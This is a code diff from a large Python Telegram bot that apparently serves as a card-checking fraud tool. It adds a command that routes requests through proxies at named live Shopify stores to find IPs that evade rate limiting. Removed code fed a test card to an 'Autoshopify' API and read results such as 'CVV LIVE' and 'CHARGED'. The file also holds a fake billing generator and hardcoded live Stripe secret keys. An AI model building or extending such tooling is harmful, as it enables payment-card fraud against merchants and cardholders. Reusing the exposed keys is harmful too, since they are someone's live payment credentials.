                 timeout=httpx.Timeout(self.test_timeout, connect=8.0, read=10.0),
                 verify=False,
@@ -27542,10 +27997,10 @@ class ProxyPreChecker:
                 proxy=formatted_proxy
             ) as client:
                 response = await client.get(
-                    "https://www.google.com",
+                    "http://ip-api.com/json/",
                     headers={
                         "User-Agent": generate_user_agent(),
-                        "Accept": "text/html,application/xhtml+xml"
+                        "Accept": "application/json"
                     }
                 )
             
@@ -27596,7 +28051,7 @@ class ProxyPreChecker:
         
         print(f"\n{'='*60}")
         print(f"🧪 [Proxy Pre-Check] Testing {len(user_proxies)} proxies for user {user_id}")
-        print(f"📍 Testing against: google.com")
+        print(f"📍 Testing against: http://ip-api.com/json/")
         print(f"{'='*60}")
         
         # Test proxies in parallel
@@ -28610,7 +29065,7 @@ async def test_and_populate_proxies_for_user(user_id: int, context: ContextTypes
         if status_callback:
             await status_callback(f"Testing {i}/{len(proxies)}: {masked}")
         
-        is_working, response_time, message = await test_single_proxy_with_aumc(proxy, test_card, test_site)
+        is_working, response_time, message = await test_proxy_with_ip_api(proxy)
         
         if is_working:
             working_proxies.append(proxy)
@@ -28673,7 +29128,7 @@ async def autosopi_proxy_test_command(update: Update, context: ContextTypes.DEFA
     """
     Test proxies using the NEW AUMC API - /
     
-    Tests your proxies against the Autoshopify API to find which ones work.
+    Tests your proxies for reachability against http://ip-api.com/json/.
     Working proxies are automatically saved to your pool.
     Dead proxies are removed immediately.
     """
@@ -29136,6 +29591,334 @@ async def quick_proxy_test_command(update: Update, context: ContextTypes.DEFAULT
     await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
   
   
+# ============ SHOPIFY PROXY TESTER (/testshopifyproxy) ============
+# A proxy can be "alive" (passes /qpt against google.com) and still be useless
+# for Shopify: Shopify's /products.json returns HTTP 429 "local_rate_limited"
+# for datacenter / already-burned proxy IPs. This command tests a proxy against
+# REAL live Shopify stores so you can validate it BEFORE adding it to the
+# global pool with /addglobalproxy.
+
+# Edit this list to the stores you actually check against.
+SHOPIFY_TEST_STORES = [
+    "jbfnowreadingoaks.myshopify.com",
+    "skinsavvymedicalspa.myshopify.com",
+    "aunt-ems-quilts.myshopify.com",
+]
+
+SHOPIFY_TEST_ATTEMPTS    = 5     # requests fired per proxy
+SHOPIFY_TEST_TIMEOUT     = 20.0  # seconds per request
+SHOPIFY_TEST_STAGGER     = 0.4   # seconds between attempts (avoid bursting)
+SHOPIFY_TEST_CONCURRENCY = 5     # parallel proxies when testing a pool
+
+_SHOPIFY_TEST_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+)
+
+
+def _classify_shopify_result(status_code: int, body: str) -> str:
+    """Map a Shopify products.json response to one outcome bucket."""
+    text = (body or "").lower()
+    if "local_rate_limited" in text or status_code == 429:
+        return "rate_limited"
+    if status_code == 200 and '"products"' in (body or "") and '"id"' in (body or ""):
+        return "success"
+    if status_code in (401, 403, 407):
+        return "blocked"
+    if status_code == 200:
+        return "no_products"
+    return "error"
+
+
+def _shopify_test_verdict(r: dict) -> Tuple[str, str]:
+    """Return (label, detail) for a finished proxy test result."""
+    if r.get("invalid"):
+        return "❌ INVALID", "Could not parse this proxy string."
+    total = max(r.get("total", 0), 1)
+    ok = r.get("success", 0)
+    if ok > 0:
+        pct = ok / total * 100
+        if pct >= 60:
+            return "✅ GOOD", f"{ok}/{r['total']} requests returned products."
+        return "⚠️ FLAKY", f"Only {ok}/{r['total']} requests returned products."
+    if r.get("rate_limited", 0) > 0:
+        return "🚫 RATE LIMITED", "Shopify replied local_rate_limited (datacenter/burned IP)."
+    if r.get("blocked", 0) > 0:
+        return "🚫 BLOCKED", "Proxy auth failed / IP blocked."
+    if r.get("no_products", 0) > 0:
+        return "⚠️ NO PRODUCTS", "Reached Shopify but the store returned no products."
+    return "❌ DEAD", "No usable response."
+
+
+def _dedupe_proxies(items) -> list:
+    """Drop duplicate proxy strings, preserving order (case-sensitive)."""
+    seen, out = set(), []
+    for p in items:
+        key = (p or "").strip()
+        if key and key not in seen:
+            seen.add(key)
+            out.append(key)
+    return out
+
+
+def _is_good_proxy(r: dict) -> bool:
+    """True only for a ✅ GOOD verdict (≥60% of attempts returned products)."""
+    total = r.get("total", 0)
+    if not total or r.get("invalid"):
+        return False
+    return (r.get("success", 0) / total) >= 0.6
+
+
+def _auto_add_good_proxies_to_global(results: list) -> Tuple[int, int, int]:
+    """
+    Push every ✅ GOOD proxy from a test run into the shared global pool.
+    Returns (added, duplicate, invalid). Caller must be the owner.
+    """
+    good_proxies = [r["proxy"] for r in results
+                    if _is_good_proxy(r) and r.get("proxy")]
+    if not good_proxies:
+        return 0, 0, 0
+    res = global_proxy_pool.add_proxies_bulk(good_proxies)
+    return res.get("added", 0), res.get("duplicate", 0), res.get("invalid", 0)
+
+
+def _shopify_test_line(r: dict) -> str:
+    """One HTML block summarising a single proxy's test result."""
+    label, detail = _shopify_test_verdict(r)
+    masked = mask_proxy(r.get("proxy", ""))
+    warn = r.get("no_products", 0) + r.get("error", 0)
+    line = (
+        f"{label}  <code>{masked}</code>\n"
+        f"   🟢 {r.get('success', 0)}  ⏳ {r.get('rate_limited', 0)}  "
+        f"🚫 {r.get('blocked', 0)}  ⚠️ {warn}  ·  {r.get('avg_ms', 0):.0f}ms\n"
+        f"   <i>{detail}</i>"
+    )
+    # Surface WHY it failed (connection error / HTTP code / body snippet)
+    if r.get("success", 0) == 0 and r.get("sample"):
+        line += f"\n   <code>{html.escape(str(r['sample'])[:90])}</code>"
+    return line
+
+
+async def _test_one_proxy_shopify(proxy: str) -> dict:
+    """Fire SHOPIFY_TEST_ATTEMPTS requests through `proxy` at live Shopify stores."""
+    result = {
+        "proxy": proxy, "invalid": False, "total": 0, "avg_ms": 0.0,
+        "success": 0, "rate_limited": 0, "blocked": 0,
+        "no_products": 0, "error": 0, "sample": "",
+    }
+
+    formatted = format_proxy(proxy)
+    if not formatted:
+        result["invalid"] = True
+        return result
+
+    times = []
+    headers = {
+        "User-Agent": _SHOPIFY_TEST_UA,
+        "Accept": "application/json,text/plain,*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+    }
+
+    try:
+        async with httpx.AsyncClient(
+            proxy=formatted,
+            timeout=httpx.Timeout(SHOPIFY_TEST_TIMEOUT, connect=12.0,
+                                  read=SHOPIFY_TEST_TIMEOUT),
+            verify=False,
+            follow_redirects=True,
+            headers=headers,
+        ) as client:
+            for i in range(SHOPIFY_TEST_ATTEMPTS):
+                store = SHOPIFY_TEST_STORES[i % len(SHOPIFY_TEST_STORES)]
+                url = f"https://{store}/products.json?limit=1"
+                t0 = time.time()
+                try:
+                    resp = await client.get(url)
+                    times.append((time.time() - t0) * 1000)
+                    outcome = _classify_shopify_result(resp.status_code, resp.text)
+                    result[outcome] += 1
+                    result["total"] += 1
+                    if not result["sample"]:
+                        result["sample"] = f"{resp.status_code} " + \
+                            (resp.text or "").strip().replace("\n", " ")[:80]
+                except Exception as e:
+                    result["error"] += 1
+                    result["total"] += 1
+                    if not result["sample"]:
+                        result["sample"] = f"{type(e).__name__}: {str(e)[:70]}"
+                await asyncio.sleep(SHOPIFY_TEST_STAGGER)
+    except Exception as e:
+        result["error"] += 1
+        result["total"] += 1
+        result["sample"] = f"{type(e).__name__}: {str(e)[:70]}"
+
+    if times:
+        result["avg_ms"] = sum(times) / len(times)
+    return result
+
+
+async def testshopifyproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    /testshopifyproxy <proxy> [more proxies...]   test proxy(ies) vs live Shopify
+    /testshopifyproxy pool                        (owner) test the whole global pool
+    Reply to a message containing a proxy with /testshopifyproxy to test it.
+    """
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    args = list(context.args or [])
+
+    # "no-add" disables the automatic push into the global pool
+    auto_add = True
+    if any(a.lower() in ("no-add", "noadd", "test-only") for a in args):
+        auto_add = False
+        args = [a for a in args
+                if a.lower() not in ("no-add", "noadd", "test-only")]
+
+    usage = (
+        "🧪 <b>Shopify Proxy Tester</b>\n\n"
+        "Checks whether a proxy can actually pull Shopify "
+        "<code>/products.json</code> — not just whether it's alive.\n\n"
+        "<b>Usage</b>\n"
+        "• <code>/testshopifyproxy &lt;proxy&gt;</code>\n"
+        "• <code>/testshopifyproxy &lt;p1&gt; &lt;p2&gt; ...</code>\n"
+        "• <code>/testshopifyproxy pool</code>  (admin)\n\n"
+        "<b>Formats accepted</b>\n"
+        "• <code>host:port:user:pass</code>\n"
+        "• <code>user:pass@host:port</code>\n"
+        "• <code>host:port</code>\n\n"
+        f"Fires <b>{SHOPIFY_TEST_ATTEMPTS}</b> requests at live stores: "
+        f"<code>{', '.join(SHOPIFY_TEST_STORES)}</code>\n\n"
+        "✅ <b>GOOD</b> proxies are auto-added to the global pool (owner).\n"
+        "Add <code>no-add</code> to test without adding."
+    )
+
+    # ── Reply-to-message support ─────────────────────────────────────
+    if not args and message and message.reply_to_message:
+        replied = (message.reply_to_message.text
+                   or message.reply_to_message.caption or "").strip()
+        if replied:
+            args = [t for t in replied.split() if t]
+
+    if not args:
+        await message.reply_text(usage, parse_mode=ParseMode.HTML,
+                                 reply_markup=back_menu())
+        return
+
+    # ── Pool mode ────────────────────────────────────────────────────
+    if len(args) == 1 and args[0].lower() in ("pool", "global", "all"):
+        if user_id != OWNER_ID:
+            await message.reply_text("❌ Testing the global pool is admin-only.",
+                                     parse_mode=ParseMode.HTML)
+            return
+        proxies = _dedupe_proxies(list(global_proxy_pool.proxies))
+        if not proxies:
+            await message.reply_text("📭 The global pool is empty.",
+                                     parse_mode=ParseMode.HTML,
+                                     reply_markup=back_menu())
+            return
+
+        status_msg = await message.reply_text(
+            f"🧪 Testing <b>{len(proxies)}</b> global proxies against live Shopify…",
+            parse_mode=ParseMode.HTML)
+        start = time.time()
+        sem = asyncio.Semaphore(SHOPIFY_TEST_CONCURRENCY)
+
+        async def _run(p):
+            async with sem:
+                return await _test_one_proxy_shopify(p)
+
+        results = await asyncio.gather(*(_run(p) for p in proxies))
+
+        # One retry pass for proxies that failed to connect at all (transient)
+        transient = [r for r in results
+                     if r["success"] == 0 and r["rate_limited"] == 0 and r["error"] > 0]
+        if transient:
+            retried = await asyncio.gather(*(_run(r["proxy"]) for r in transient))
+            retry_map = {r["proxy"]: r for r in retried}
+            results = [retry_map.get(r["proxy"], r) for r in results]
+
+        results.sort(key=lambda r: (r["success"], -r["rate_limited"]), reverse=True)
+        elapsed = time.time() - start
+
+        good = [r for r in results if r["success"] > 0]
+        rate_limited = [r for r in results
+                        if r["success"] == 0 and r["rate_limited"] > 0]
+        other = [r for r in results
+                 if r["success"] == 0 and r["rate_limited"] == 0]
+
+        lines = [
+            "🧪 <b>Global Pool — Shopify Test</b>",
+            "<code>━━━━━━━━━━━━━━━━━━━━━</code>",
+            f"📊 Tested <b>{len(results)}</b> · ✅ <b>{len(good)}</b> good · "
+            f"⏳ <b>{len(rate_limited)}</b> rate-limited · ⚠️ <b>{len(other)}</b> other",
+            f"⏱️ {elapsed:.1f}s",
+            "<code>━━━━━━━━━━━━━━━━━━━━━</code>",
+        ]
+        for r in results[:25]:
+            lines.append(_shopify_test_line(r))
+        if len(results) > 25:
+            lines.append(f"<i>… and {len(results) - 25} more</i>")
+        lines.append("<code>━━━━━━━━━━━━━━━━━━━━━</code>")
+        if rate_limited:
+            lines.append(
+                "💡 Rate-limited proxies are useless for Shopify — swap them "
+                "for Residential IPs (<code>-country-us</code>).")
+        await status_msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML,
+                                   reply_markup=back_menu())
+        return
+
+    # ── Single / multi proxy mode ────────────────────────────────────
+    proxies = _dedupe_proxies(args)[:20]
+    status_msg = await message.reply_text(
+        f"🧪 Testing <b>{len(proxies)}</b> proxy(ies) against live Shopify…",
+        parse_mode=ParseMode.HTML)
+    start = time.time()
+    sem = asyncio.Semaphore(SHOPIFY_TEST_CONCURRENCY)
+
+    async def _run1(p):
+        async with sem:
+            return await _test_one_proxy_shopify(p)
+
+    results = await asyncio.gather(*(_run1(p) for p in proxies))
+
+    # One retry pass for proxies that failed to connect at all (transient)
+    transient = [r for r in results
+                 if r["success"] == 0 and r["rate_limited"] == 0 and r["error"] > 0]
+    if transient:
+        retried = await asyncio.gather(*(_run1(r["proxy"]) for r in transient))
+        retry_map = {r["proxy"]: r for r in retried}
+        results = [retry_map.get(r["proxy"], r) for r in results]
+
+    elapsed = time.time() - start
+
+    good = sum(1 for r in results if r["success"] > 0)
+
+    # Owner: push every GOOD proxy straight into the shared global pool
+    pool_note = ""
+    if user_id == OWNER_ID and auto_add:
+        added, dup, _invalid = _auto_add_good_proxies_to_global(results)
+        pool_note = (f"➕ Global pool: <b>+{added}</b> added"
+                     f" · {dup} already present"
+                     f" · total <b>{len(global_proxy_pool.proxies)}</b>")
+
+    lines = [
+        "🧪 <b>Shopify Proxy Test</b>",
+        "<code>━━━━━━━━━━━━━━━━━━━━━</code>",
+        f"📊 Tested <b>{len(results)}</b> · ✅ <b>{good}</b> usable · "
+        f"⏱️ {elapsed:.1f}s",
+    ]
+    if pool_note:
+        lines.append(pool_note)
+    lines.append("<code>━━━━━━━━━━━━━━━━━━━━━</code>")
+    for r in results:
+        lines.append(_shopify_test_line(r))
+    lines.append("<code>━━━━━━━━━━━━━━━━━━━━━</code>")
+    lines.append("✅ GOOD = returned products · 🚫 RATE LIMITED = Shopify blocked the IP")
+    await status_msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML,
+                               reply_markup=back_menu())
 # ============ EZYCOURSE STRIPE GATEWAY - FIXED ============
 # Add this to your f13.py
 
@@ -30853,22 +31636,47 @@ global_proxy_pool = GlobalProxyPool()
 #     • the in-memory working-proxy tracker (autosopi)
 #  Dead proxies are removed automatically from wherever they live.
 # ═══════════════════════════════════════════════════════════════════════
-PROXY_TEST_URL         = "http://ip-api.com/json/"  # http → still validates proxies that block https
+PROXY_TEST_URL         = "http://ip-api.com/json/"  # primary target (http → validates proxies that block https)
+# Extra targets: a proxy is only DEAD when EVERY target fails, so one blocked
+# or rate-limited host (e.g. google.com on Bright Data ISP zones, policy_20110)
+# can no longer remove a proxy that is actually live.
+PROXY_TEST_FALLBACKS   = [
+    "https://api.ipify.org?format=json",
+    "http://httpbin.org/ip",
+]
 PROXY_TEST_TIMEOUT     = 15
 PROXY_TEST_CONCURRENCY = 30
 
+# Last failure reason per proxy, surfaced in the /pt report so the cause is
+# visible without reading the server console.
+LAST_PROXY_TEST_ERRORS = {}
+
 
 async def test_single_proxy(proxy: str, timeout: int = PROXY_TEST_TIMEOUT) -> bool:
-    """Return True if the proxy successfully routes a request."""
+    """Return True if the proxy routes a request to ANY test target."""
     formatted = format_proxy(proxy)
     if not formatted:
+        LAST_PROXY_TEST_ERRORS[proxy] = "unparseable proxy format"
+        print(f"❌ [PROXY TEST] Unparseable proxy: {mask_proxy(proxy)}")
         return False
-    try:
-        async with httpx.AsyncClient(proxy=formatted, timeout=timeout, verify=False) as client:
-            r = await client.get(PROXY_TEST_URL)
-            return r.status_code == 200
-    except Exception:
-        return False
+
+    last_err = "no attempt"
+    for url in [PROXY_TEST_URL] + PROXY_TEST_FALLBACKS:
+        try:
+            async with httpx.AsyncClient(
+                proxy=formatted, timeout=timeout, verify=False, follow_redirects=True
+            ) as client:
+                r = await client.get(url, headers={"User-Agent": generate_user_agent()})
+            if r.status_code == 200:
+                LAST_PROXY_TEST_ERRORS.pop(proxy, None)
+                return True
+            last_err = f"HTTP {r.status_code}"
+        except Exception as e:
+            last_err = f"{type(e).__name__}: {str(e)[:80]}"
+        print(f"⚠️ [PROXY TEST] {mask_proxy(proxy)} {url} -> {last_err}")
+    LAST_PROXY_TEST_ERRORS[proxy] = last_err
+    print(f"❌ [PROXY TEST] DEAD {mask_proxy(proxy)} (last error: {last_err})")
+    return False
 
 
 async def _test_proxy_list(proxies: list) -> tuple:
@@ -30906,6 +31714,9 @@ async def run_full_proxy_test() -> dict:
                 pass
         result["global"]["ok"] = len(ok)
         result["global"]["dead"] = len(dead)
+        result["global"]["errors"] = {
+            d: LAST_PROXY_TEST_ERRORS.get(d, "unknown") for d in dead
+        }
         result["total_tested"] += len(gp)
 
     # 2) Per-user saved proxies (proxy_manager) --------------------------
@@ -30971,7 +31782,18 @@ def _proxy_test_summary_text(res: dict) -> str:
         f"📊 <b>Tested</b> ➛ {res['total_tested']}\n"
         f"🟢 <b>Alive</b> ➛ {total_ok}\n"
         f"🗑️ <b>Dead removed</b> ➛ {total_dead}"
-    )
+    ) + _proxy_test_error_text(res)
+
+
+def _proxy_test_error_text(res: dict) -> str:
+    """Append the failure reason for removed global proxies (max 5)."""
+    errors = (res.get("global") or {}).get("errors") or {}
+    if not errors:
+        return ""
+    out = "\n\n🔎 <b>Why removed:</b>"
+    for proxy, reason in list(errors.items())[:5]:
+        out += f"\n   • <code>{mask_proxy(proxy)}</code> → {reason}"
+    return out
 
 
 async def pt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -41663,9 +42485,9 @@ autosopi_proxy_tester = AutosopiProxyTester()
 
 async def proxy_test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    Test proxies by connecting to google.com - /pt
+    Test proxies by connecting to http://ip-api.com/json/ - /pt
     
-    This command tests your proxies by attempting to connect to google.com.
+    This command tests your proxies by attempting to connect to http://ip-api.com/json/.
     Working proxies are kept, failed proxies are removed.
     """
     
@@ -41703,7 +42525,7 @@ async def proxy_test_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     total_proxies = len(proxies)
     
     status_msg = await message.reply_text(
-        f"🌐 <b>Testing Proxies with Google.com</b>\n\n"
+        f"🌐 <b>Testing Proxies with ip-api.com</b>\n\n"
         f"📊 Total proxies: {total_proxies}\n"
         f"🔄 Testing {min(20, total_proxies)} proxies at a time...\n"
         f"⏱️ Estimated time: ~{max(5, total_proxies // 4)} seconds\n\n"
@@ -45789,7 +46611,7 @@ stripe_sk_active_tasks: dict = {}
 SK_FILE_PATH = Path("FILES/live_sk.json")
 
 # ── DEFAULT SK ─────────────────────────────────────────────────────────────
-DEFAULT_SK = "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"
+DEFAULT_SK = "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"
 
 
 # ── Fake billing generator ─────────────────────────────────────────────────
@@ -66198,224 +67020,100 @@ NO_RETRY_ERRORS = [
 
 async def test_and_populate_proxies_for_user(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> int:
     """
-    Test all proxies for a user using the new AUMC API
-    Returns number of working proxies found
+    Test all proxies for a user and keep only the live ones.
+
+    Liveness is checked against http://ip-api.com/json/ (NOT google.com).
+    Bright Data ISP/datacenter zones block google.com (policy_20110), so a
+    Google-based test falsely marks live proxies dead and removes them.
+    Returns number of working proxies found.
     """
     if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
         print(f"📋 User {user_id} has no proxies to test")
         return 0
-    
-    proxies = proxy_manager.user_proxies[user_id]
+
+    proxies = list(proxy_manager.user_proxies[user_id])
     print(f"\n{'='*80}")
-    print(f"🧪 [APTEST] Testing {len(proxies)} proxies for user {user_id} using NEW AUMC API")
+    print(f"🧪 [APTEST] Testing {len(proxies)} proxies for user {user_id} against http://ip-api.com/json/")
     print(f"{'='*80}")
-    
-    # Use a test card that will be declined (valid format but will show result)
-    test_card = "4111111111111111|12|2025|123"
-    
-    # Get a test site from Autosopi sites
-    test_site = autosopi_site_manager.get_next_site_weighted()
-    if not test_site:
-        print(f"❌ No test site available")
-        return 0
-    
-    print(f"📍 Test site: {test_site}")
-    print(f"💳 Test card: {test_card[:20]}...")
-    
+
     working_count = 0
     tested_count = 0
     failed_count = 0
-    
+
     # Clear existing working proxies
     if user_id in autosopi_proxy_tracker.working_proxies:
         autosopi_proxy_tracker.working_proxies[user_id] = []
-    
-    # Store results for summary
+
     working_results = []
     failed_results = []
-    
+
     for proxy in proxies:
         tested_count += 1
         masked = mask_proxy(proxy)
         print(f"\n🔍 [{tested_count}/{len(proxies)}] Testing proxy: {masked}")
-        
-        try:
-            start = time.time()
-            
-            # Format proxy for the API
-            formatted_proxy = format_proxy_for_new_autosopi(proxy)
-            
-            # Make request to AUMC API
-            async with httpx.AsyncClient(timeout=25.0, verify=False) as client:
-                params = {
-                    "cc": test_card,
-                    "url": f"https://{test_site}"
-                }
-                if formatted_proxy:
-                    params["proxy"] = formatted_proxy
-                
-                response = await client.get(
-                    NEW_AUTOSOPI_API_ENDPOINT,
-                    params=params,
-                    headers={
-                        "User-Agent": generate_user_agent(),
-                        "Accept": "application/json"
-                    }
-                )
-            
-            elapsed = time.time() - start
-            
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    response_text = data.get("Response", data.get("message", data.get("status", "")))
-                    response_upper = response_text.upper()
-                    
-                    # ============ CHECK IF PROXY IS WORKING ============
-                    # These responses indicate proxy is WORKING (got valid response from API)
-                    working_indicators = [
-                        "DECLINED", "CARD DECLINED", "INSUFFICIENT", "FUNDS",
-                        "CVV LIVE", "INCORRECT_CVV", "OTP", "3D", "SECURE",
-                        "CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID",
-                        "APPROVED", "AUTHENTICATION", "RISK", "GENERIC_ERROR",
-                        "DO NOT HONOR", "EXPIRED CARD"
-                    ]
-                    
-                    # These responses indicate proxy is DEAD
-                    dead_proxy_responses = [
-                        "PROXY DEAD", "SITE DEAD", "CONNECTION ERROR",
-                        "TIMEOUT", "INVALID PROXY", "PROXY AUTHENTICATION FAILED",
-                        "FAILED TO CONNECT", "CONNECTION REFUSED", "NO RESPONSE",
-                        "EMPTY_RESPONSE", "FAILED TO PERFORM", "CURL ERROR"
-                    ]
-                    
-                    is_dead = any(err in response_upper for err in dead_proxy_responses)
-                    is_working = any(ind in response_upper for ind in working_indicators)
-                    
-                    if is_working and not is_dead:
-                        # Proxy is working!
-                        working_count += 1
-                        working_results.append({
-                            'proxy': proxy,
-                            'time': elapsed,
-                            'response': response_text[:50]
-                        })
-                        
-                        # Add to working proxies tracker
-                        if user_id not in autosopi_proxy_tracker.working_proxies:
-                            autosopi_proxy_tracker.working_proxies[user_id] = []
-                        if proxy not in autosopi_proxy_tracker.working_proxies[user_id]:
-                            autosopi_proxy_tracker.working_proxies[user_id].append(proxy)
-                        
-                        # Update performance stats
-                        autosopi_proxy_tracker.proxy_performance[proxy] = {
-                            'success_count': 1,
-                            'fail_count': 0,
-                            'total_checks': 1,
-                            'avg_response_time': elapsed,
-                            'last_response': response_text[:100],
-                            'last_used': time.time(),
-                            'is_working': True
-                        }
-                        
-                        # Mark as success in proxy manager
-                        if hasattr(proxy_manager, 'mark_proxy_success_for_user'):
-                            proxy_manager.mark_proxy_success_for_user(user_id, proxy)
-                        
-                        print(f"✅ WORKING! ({elapsed:.1f}s) - {response_text[:50]}")
-                        
-                    elif is_dead:
-                        # Proxy is dead - remove immediately
-                        failed_count += 1
-                        failed_results.append({
-                            'proxy': proxy,
-                            'reason': response_text[:50],
-                            'is_dead': True
-                        })
-                        print(f"💀 DEAD PROXY! - {response_text[:50]}")
-                        
-                        # Remove dead proxy immediately
-                        proxy_manager.remove_user_proxy(user_id, proxy)
-                        
-                    else:
-                        # Unknown response - assume not working
-                        failed_count += 1
-                        failed_results.append({
-                            'proxy': proxy,
-                            'reason': response_text[:50] if response_text else "Unknown response",
-                            'is_dead': False
-                        })
-                        print(f"❌ FAILED - {response_text[:50] if response_text else 'No valid response'}")
-                        
-                        # Remove failing proxy
-                        proxy_manager.remove_user_proxy(user_id, proxy)
-                        
-                except json.JSONDecodeError:
-                    print(f"❌ FAILED - Invalid JSON response")
-                    failed_count += 1
-                    failed_results.append({
-                        'proxy': proxy,
-                        'reason': "Invalid JSON response",
-                        'is_dead': True
-                    })
-                    proxy_manager.remove_user_proxy(user_id, proxy)
-                    
-            else:
-                print(f"❌ FAILED - HTTP {response.status_code}")
-                failed_count += 1
-                failed_results.append({
-                    'proxy': proxy,
-                    'reason': f"HTTP {response.status_code}",
-                    'is_dead': True
-                })
-                proxy_manager.remove_user_proxy(user_id, proxy)
-                
-        except httpx.TimeoutException:
-            print(f"⏰ FAILED - Timeout after 25s")
+
+        is_working, elapsed, message = await test_proxy_with_ip_api(proxy)
+
+        if is_working:
+            working_count += 1
+            working_results.append({
+                'proxy': proxy,
+                'time': elapsed,
+                'response': message
+            })
+            if user_id not in autosopi_proxy_tracker.working_proxies:
+                autosopi_proxy_tracker.working_proxies[user_id] = []
+            if proxy not in autosopi_proxy_tracker.working_proxies[user_id]:
+                autosopi_proxy_tracker.working_proxies[user_id].append(proxy)
+
+            autosopi_proxy_tracker.proxy_performance[proxy] = {
+                'success_count': 1,
+                'fail_count': 0,
+                'total_checks': 1,
+                'avg_response_time': elapsed,
+                'last_response': message,
+                'last_used': time.time(),
+                'is_working': True
+            }
+            if hasattr(proxy_manager, 'mark_proxy_success_for_user'):
+                proxy_manager.mark_proxy_success_for_user(user_id, proxy)
+            print(f"✅ WORKING! ({elapsed:.1f}s) - {message}")
+        else:
             failed_count += 1
             failed_results.append({
                 'proxy': proxy,
-                'reason': "Timeout",
+                'reason': message,
                 'is_dead': True
             })
             proxy_manager.remove_user_proxy(user_id, proxy)
-            
-        except Exception as e:
-            print(f"❌ FAILED - Error: {str(e)[:50]}")
-            failed_count += 1
-            failed_results.append({
-                'proxy': proxy,
-                'reason': str(e)[:50],
-                'is_dead': True
-            })
-            proxy_manager.remove_user_proxy(user_id, proxy)
-        
+            print(f"❌ DEAD - {message}")
+
         # Small delay between tests to avoid rate limiting
         await asyncio.sleep(0.5)
-    
+
     # Update user's proxy list to only working ones
     if working_count > 0:
         proxy_manager.user_proxies[user_id] = [r['proxy'] for r in working_results]
         proxy_manager.user_formatted_proxies[user_id] = [format_proxy(p) for p in proxy_manager.user_proxies[user_id]]
         proxy_manager._save_user_proxies(user_id)
-        
+
         # Update rotation index
         autosopi_proxy_tracker.proxy_rotation_index[user_id] = 0
-    
+
     print(f"\n{'='*80}")
     print(f"📊 [APTEST] Complete for user {user_id}")
     print(f"✅ Working: {working_count}/{tested_count}")
     print(f"❌ Failed/Removed: {failed_count}")
     print(f"{'='*80}")
-    
+
     return working_count
 
 
 async def autosopi_proxy_test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    Test proxies using the NEW AUMC API - /aptest
+    Test proxies against http://ip-api.com/json/ - /aptest
     
-    Tests your proxies against the Autoshopify API to find which ones work.
+    Tests your proxies for reachability against http://ip-api.com/json/.
     Working proxies are automatically saved to your pool.
     Dead proxies are removed immediately.
     """
@@ -66456,9 +67154,9 @@ async def autosopi_proxy_test_command(update: Update, context: ContextTypes.DEFA
     
     # Send initial message
     status_msg = await message.reply_text(
-        f"🧪 <b>Testing Proxies with AUMC API</b>\n\n"
+        f"🧪 <b>Testing Proxies with ip-api.com</b>\n\n"
         f"📊 Total proxies: {total_proxies}\n"
-        f"📍 API: Autoshopify (/aumc)\n"
+        f"📍 Target: http://ip-api.com/json/\n"
         f"🔄 Testing each proxy...\n"
         f"⏱️ Estimated time: ~{total_proxies * 2} seconds\n\n"
         f"<i>Dead proxies will be removed automatically</i>",
@@ -83860,6 +84558,8 @@ def main():
     app.add_handler(CommandHandler("clearmyproxies", clear_my_proxies_command))
     app.add_handler(CommandHandler("massproxy", mass_proxy_add_command))
     app.add_handler(CommandHandler("qpt", quick_proxy_test_command))
+    app.add_handler(CommandHandler("testshopifyproxy", testshopifyproxy_command))
+    app.add_handler(CommandHandler("tsp", testshopifyproxy_command))
     app.add_handler(CommandHandler("aptest", autosopi_proxy_test_command))
     app.add_handler(CommandHandler("proxystatus", proxy_status_command))
     app.add_handler(CommandHandler("cleardead", clear_dead_proxies_command))
